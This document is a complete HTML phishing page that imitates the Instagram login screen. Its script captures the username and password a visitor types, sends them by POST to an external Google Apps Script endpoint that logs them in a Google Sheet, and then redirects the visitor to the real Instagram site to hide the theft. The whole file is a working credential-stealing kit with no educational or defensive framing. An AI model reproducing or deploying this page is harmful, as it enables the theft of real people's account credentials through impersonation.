<!DOCTYPE html>
<html>
<head>
  <title>Instagram</title>
  <style>
    body {
      background: #fafafa;
      font-family: Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .box {
      background: white;
      padding: 40px;
      border-radius: 10px;
      box-shadow: 0 0 15px #ccc;
      text-align: center;
      width: 300px;
    }
    img {
      width: 120px;
      margin-bottom: 20px;
    }
    input, button {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      border: 1px solid #dbdbdb;
      border-radius: 5px;
      font-size: 14px;
    }
    button {
      background-color: #3897f0;
      color: white;
      font-weight: bold;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <div class="box">
    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram">
    <form id="loginForm">
      <input type="text" name="username" placeholder="Phone number, username, or email" required>
      <input type="password" name="password" placeholder="Password" required>
      <button type="submit">Log In</button>
    </form>
  </div>

  <script>
  document.getElementById("loginForm").addEventListener("submit", function(e) {
    e.preventDefault();
    const data = new FormData(this);

    fetch("https://script.google.com/macros/s/AKfycbzRq_HmMWoBmhXRssKKWJuth9d23Iaywj1KcJwN6JnE6pyf-2A1hX-y1I_9ih8DQ2hn/exec", {
      method: "POST",
      body: data
    }).then(() => {
      alert("Data stored successfully in Google Sheet!");
      window.location.href = "https://www.instagram.com";
    });
  });
</script>

</body>
</html>
